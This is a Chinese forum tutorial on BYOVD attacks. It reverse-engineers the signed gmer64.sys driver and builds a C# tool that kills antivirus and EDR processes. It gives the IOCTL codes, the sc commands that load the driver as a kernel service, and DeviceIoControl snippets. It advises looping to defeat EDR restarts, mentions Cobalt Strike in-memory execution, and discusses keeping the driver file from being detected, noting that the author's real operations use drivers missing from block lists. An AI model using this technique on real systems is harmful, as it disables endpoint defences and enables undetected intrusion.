# BYOVD技术实战：利用内核驱动关闭杀软进程

> **来源**: https://forum.butian.net/share/2832  
> **文章ID**: 2832

---

BYOVD技术实战：利用内核驱动关闭杀软进程
======================

BYOVD介绍
-------

在APT攻击链中，Ring0层的攻击主要使用BYOVD技术加载Rootkit，达到削弱防御与持久化的目的。BYOVD是`Bring Your Own Vulnerable Driver`的缩写，是一种对抗性技术，攻击者将易受攻击的合法驱动程序植入目标系统。然后，他们利用易受攻击的驱动程序执行恶意操作。由于合法签名的驱动程序受安全软件信任，因此它们既不会被标记也不会被阻止。此外，BYOVD 攻击中涉及的驱动程序通常是内核模式驱动程序。成功利用此漏洞可让攻击者实现内核级权限提升，从而授予他们对目标上系统资源的最高级别的访问和控制。攻击者通过禁用端点安全软件或逃避检测来利用这种升级的权限。一旦端点安全防御受到威胁，攻击者就可以不受任何阻碍地自由地从事恶意活动。  
像是常见的可利用驱动，可以从`https://www.loldrivers.io/`中查看和下载。像是国内开发者开发了[RealBlindingEDR](https://github.com/myzxcg/RealBlindingEDR/tree/main)，这个项目目前使用了四个驱动来对应不同的系统版本：

1. [echo\_driver.sys](https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/) (support win10+)
2. [dbutil\_2\_3.sys](https://www.loldrivers.io/drivers/a4eabc75-edf6-4b74-9a24-6a26187adabf/) (support win7+)
3. wnBio.sys (supports Windows Version 6.3+)（这个我不知道他从哪里搞的，我也没找到下载路径）
4. [GPU-Z.sys](https://github.com/huoji120/Antivirus_R3_bypass_demo)(only supports Windows Version 6.1)

本文将以[Gmer64.sys](https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/)为例，来分析该驱动的漏洞利用和实现一个C#程序进行杀软进程关闭，这样也便于cobaltstike进行内存加载执行。

Gmer64.sys
----------

### 驱动介绍

这个驱动来源于[GMER](http://www.gmer.net/)，GMER是一个检测和删除rootkit的应用程序，可以看到目前官方程序还在更新：

![Pasted image 20240325142742.png](images/attach-7a32ae2f5f65d8a840dbf6d93912fe60fdcd417b.png)  
本文使用的驱动文件是从loldrivers下载的：[gmer64.sys](https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/?query=gmer64.sys)，如果跟随本文进行分析的话建议下载同一版本。目前gmer64.sys在最新版的windows11证书已经被吊销了，并且被杀软进行了标记，落地就会被杀，所以本文仅作为学习目的。

### 漏洞分析

我们在寻找合适的驱动时，需要看该驱动是否存在我们需要的函数，例如我们想要关闭杀软进程，需要去导入表查看是否存在可利用函数（此处为ZwTerminateProcess）：

![Pasted image 20240325143723.png](images/attach-05bce57519c46e57874c169e7a58e1f659a15b81.png)  
Zw函数为原生API包装函数，这组函数作为NTDLL.dll中的原生API的镜像，驱动程序必须调用Zw系列函数来保证安全性，如果内核驱动需要调用某个系统服务，就没必要跟用户模式一样检查和接收用户模式调用者所受的限制，当调用Zw函数时，会设置`PreviousMode`变量为`KernelMode`，表示当前操作或接下来的操作将在内核模式下执行。  
将该驱动拖入到IDA中，驱动入口函数为DriverEntry：

![Pasted image 20240325144524.png](images/attach-7249ca90a9bab6aef121512ed5c5cd653469a93d.png)  
因为是第三方驱动，没有办法找到pdb，所以除了那几个通用函数外其他函数符号无法知悉，我们直接去查ZwTerminateProcess的调用函数：  
字符串查找：

![Pasted image 20240325145006.png](images/attach-b75d48a3654d18eb0dcd8a9cb3bd404f362d83bb.png)  
双击进入导入表：

![Pasted image 20240325145036.png](images/attach-8a2e37299ffe6fde3a2ea5314d9dfc8a40fc6727.png)  
查看交叉引用：

![Pasted image 20240325145059.png](images/attach-83589e29beba68db0acd52e3fef4599e37ea12c1.png)  
反编译，查看sub\_164C0伪代码：

![Pasted image 20240325145216.png](images/attach-14550f9460dc4eeb37f9b034c1b0b423b56c68ca.png)  
该函数需要传入一个uint变量，表示进程PID；函数的功能为：

- 初始化`ClientId`和`ObjectAttributes`结构，这些用于后续的`ZwOpenProcess`调用。ClientId结构体中的`UniqueProcess`字段被设置为传入的参数`a1`（PID），而`UniqueThread`字段被设置为0，表示函数关注的是进程而不是特定线程。
- `KeStackAttachProcess`：将当前线程的上下文附加到指定的进程上下文，以便可以安全地访问该进程的地址空间。
- `ZwOpenProcess`：使用初始化好的ClientId和ObjectAttributes，尝试打开具有指定PID的进程，并获取该进程的句柄。打开权限是`PROCESS_QUERY_INFORMATION`。
- 检查`ZwOpenProcess`函数调用是否成功（返回值为STATUS\_SUCCESS，即0）。
- 如果成功打开进程，使用`ObReferenceObjectByHandle`获取指向进程对象的指针。
- 根据全局变量`dword_1CE40`的值，修改进程对象的某个属性。这里看起来像是正在更改进程的标志或状态，`&= ~0x2000u`操作是清除特定的位标志。
- 使用`ObfDereferenceObject`减少对象的引用计数。
- 调用`ZwTerminateProcess`尝试终止进程。
- 关闭进程的句柄。
- 将当前线程的上下文从之前附加的进程上下文中分离。  
    函数的返回值为`ZwTerminateProcess`的调用结果，表示进程是否被成功终止。  
    查看这个函数的交叉引用调用方式：  
    `DriverEntry -> sub_12844 -> sub_12448 -> sub_1132C -> sbu_164C0`

![Pasted image 20240325150002.png](images/attach-130341a6f8712451986e659fbf62e32f168d071b.png)  
我们从DriverEntry分析看起，传入的DriverObject会传入sub\_12844进行处理：

![Pasted image 20240325150309.png](images/attach-f93a45add37678497ef601d0a5816a862b12e494.png)  
进入sub\_12844函数进行查看：  
此处创建符号链接，符号链接是一个字符串名称，它映射到另一个字符串名称，通常用于为设备提供一个易于理解和访问的名称。这些名称通常出现在`\DosDevices`目录（也可以被称为`\??`，后续学习的过程中大家可能会遇到`\??`，原因就是这样），使得用户模式下的应用程序可以通过一个名称来访问设备。

![Pasted image 20240325150940.png](images/attach-c0a533e4151d99a0d14bb44921e65060cb9c53e5.png)  
下面的DriverObject成员的传递是我们本次分析的重点：

```php
      DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_12448;
      DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_12448;
      DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_12448;
      DriverObject->MajorFunction[16] = (PDRIVER_DISPATCH)&sub_12448;
```

MajorFunction是驱动对象（DriverObject）中的一个数组，用于存储处理I/O请求包（IRP）的函数指针。Windows定义了许多不同类型的IRP，每种都对应一个特定的索引值。

- IRP\_MJ\_DEVICE\_CONTROL：索引14，表示设备控制的IRP请求。
- IRP\_MJ\_CLOSE：索引2，指关闭文件或设备的IRP请求。
- IRP\_MJ\_CREATE：索引0，指创建文件或设备的IRP请求。
- IRP\_MJ\_SHUTDOWN：索引16，代表关闭系统的IRP请求。  
    相关的控制索引可以从wdm.h头文件中进行查看。我们对驱动进行控制核心的IRP请求为IRP\_MJ\_DEVICE\_CONTROL，对应kernel32.dll中的DeviceIoControl函数进行控制，目前所有的驱动程序代码都导向这个分发例程，这个也是完成工作的实际例程。驱动程序会支持多个控制代码，当出现未识别的控制代码时就会让请求失败。可以看到DriverObject->MajorFunction的IRP请求都是经过sub\_12448进行处理的，因此分析该函数：

![Pasted image 20240325152326.png](images/attach-1942a01d27964b997fe4afabeea4b7f8e0743f55.png)  
这个函数的返回值v2是由sub\_1132C控制的，进一步进入sub\_1132C进行分析：

![Pasted image 20240325152452.png](images/attach-4d21beccb8cb7ff55589d352100076b3e71c0817.png)  
可以看到该函数中存在若干case进行判断，对应的十六进制数就是我们需要传入的控制码。  
在 Windows 系统中，当用户模式应用程序需要与设备进行交互时，它会使用DeviceIoControl函数发送控制代码和数据到一个内核模式驱动程序。DeviceIoControl负责从用户空间发送请求到内核空间，并最终到达指定设备的驱动程序。在驱动程序中，一个IRP会被创建来表示这个请求，其中包含了用户请求的操作类型（如读、写或设备控制），以及任何必要的数据缓冲区。驱动程序的责任是处理这些 IRP，并提供相应的结果。sub\_12448 函数是处理从用户空间传来的 IRP 的函数。当驱动程序收到一个 IRP 时，它会根据 IRP 的类型调用相应的处理函数。`MajorFunction[14]`，表示一个 IRP\_MJ\_DEVICE\_CONTROL 类型的请求，它对应于用户模式下的 DeviceIoControl 调用。  
然后 sub\_1132C 是实际处理这个 IRP\_MJ\_DEVICE\_CONTROL 请求的内核模式函数。它会根据从 DeviceIoControl 传递的参数执行相应的设备操作，我们在使用C#开发利用程序时，需要对DeviceIoControl的参数进行控制，下图为当前程序的参数，如果参数存在问题就无法进行驱动控制：（在实际使用DeviceIoControl时，要根据原本的调用方式进行参数修改来符合驱动要求的参数传递）

![Pasted image 20240325161904.png](images/attach-37255ddab4bee403f28c2b5f3605a50b2688bbd8.png)  
所有的IOCTL（控制码）使用的都是相同的DeviceIoControl。  
在该驱动中，初始化驱动的IOCTL为：`0x9876C004`

![Pasted image 20240325153745.png](images/attach-e95f5153f3e166aae57db2b3a78a822896a3853d.png)  
关闭进程使用的IOCTL为：`0x9876C094`

![Pasted image 20240325153933.png](images/attach-3238ea8d977190206ba514ac35ab9fb7912c9fda.png)  
可以看到该IOCTL最后触发了我们最开始分析的sub\_164C0函数，其中传入的参数a2（PID）在DeviceIoControl中进行传递，最后在sub\_1132C中进行调用：

![Pasted image 20240325154451.png](images/attach-5e24ff6558d9beb98b017727b51dfc1fc2df7960.png)

### 代码实现

目前开源的Terminator都是把设置驱动符号链接和加载驱动都写到代码中了，但是为了方便测试，这两部分我的代码使用的是手动操作：

```php
sc create gmer binPath= "C:\Users\username\Desktop\gmer64.sys" type= kernel start= demand
sc start gmer
```

这两步需要在管理员权限下进行操作，接下来看我们的代码：

```C#
        IntPtr hDevice = NativeMethods.CreateFile(
            @"\\.\\gmer",
            NativeMethods.GenericAccess.GENERIC_WRITE | NativeMethods.GenericAccess.GENERIC_READ,
            NativeMethods.FileShare.FILE_SHARE_READ | NativeMethods.FileShare.FILE_SHARE_WRITE,
            IntPtr.Zero,
            NativeMethods.FileMode.OPEN_EXISTING,
            NativeMethods.FileFlagsAndAttributes.FILE_ATTRIBUTE_NORMAL,
            IntPtr.Zero);
```

这一步骤为获取控制设备的句柄，其中`@"\\.\\gmer"`对应我们在本地运行的服务，服务状态可以使用下面的操作（使用powershell的话把sc改为sc.exe）：

```php
sc qc gmer // 查询状态
sc query gmer // 查询详细状态
sc start gmer // 启动服务
sc stop gmer // 停止服务
sc delete gmer // 删除服务
```

接下来进行驱动初始化：

```C#
        bool result = NativeMethods.DeviceIoControl( // init_code
            hDevice,
            INITIALIZE_IOCTL_CODE,
            ref input,
            sizeof(uint),
            output,
            outputSize,
            out bytesReturned,
            IntPtr.Zero);

        if (!result)
        {
            Console.WriteLine($"Failed to send initializing request {INITIALIZE_IOCTL_CODE:X} !!");
            return;
        }

```

接下来进行进程终止，此处作为演示只终止了一次，但是EDR会存在不断拉起的情况，因此可以设置循环检测：

```C#
        // 发送IO终止符号
        result = NativeMethods.DeviceIoControl(
            hDevice,
            TERMINATE_PROCESS_IOCTL_CODE,
            ref input, // 输入PID
            sizeof(uint),
            output,
            0,
            out bytesReturned,
            IntPtr.Zero);
```

该项目目前已经开源：[Gmer64](https://github.com/10cks/Gmer64)，欢迎师傅们一起交流学习。

### 关于驱动文件免杀

驱动文件的加载需要落地（不考虑mapper的情况，而且mapper自身也需要落地），如何在不改变驱动签名的情况下进行免杀就显得十分重要了。之前看到一篇文章，能够在不改变签名的情况下通过修改 PE optional headers 中对应的字段，来在驱动文件末尾新增0x00或0x90来改变文件hash，并且不掉签名，虽然改变了hash，但是还是没起到什么作用。具体参考的文章为：[BlackHat议题解析：Windows程序的数字签名校验“漏洞”](https://cloud.tencent.com/developer/article/1040529)  
所以目前在实战中我用的是没有在loldrivers上的白驱动，但是如何对驱动免杀，我感觉依然值得讨论。

参考链接
====

[ThreadSleeper: Suspending Threads via GMER64 Driver](https://www.binarydefense.com/resources/blog/threadsleeper-suspending-threads-via-gmer64-driver/)  
[白驱动-Kill-AV/EDR下](https://myzxcg.com/2023/10/%E7%99%BD%E9%A9%B1%E5%8A%A8-Kill-AV/EDR%E4%B8%8B/)
